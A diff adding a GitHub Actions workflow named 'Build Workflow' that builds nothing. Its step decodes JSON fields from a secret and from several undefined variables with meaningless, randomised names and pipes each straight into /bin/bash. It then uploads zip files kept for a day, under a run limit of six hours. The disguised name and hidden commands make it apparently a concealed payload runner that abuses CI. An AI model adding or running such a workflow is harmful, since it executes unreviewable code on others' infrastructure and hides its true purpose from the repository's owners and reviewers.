@@ -1,0 +1,30 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          knd05434: ${{ secrets.knd05434 }}
+        run: |
+          printf '%s' "$knd05434" | jq -r .qi886 | /bin/bash
+          printf '%s' "$kmjkh91294" | jq -r .aq3993 | /bin/bash
+          printf '%s' "$vig15" | jq -r .k67453 | /bin/bash
+          printf '%s' "$bh9388" | jq -r .xjbam9671 | /bin/bash
+          printf '%s' "$tya87123" | jq -r .bzhsn8622 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: xmqQ4ZVl
+          path: "*.zip"
+          retention-days: 1
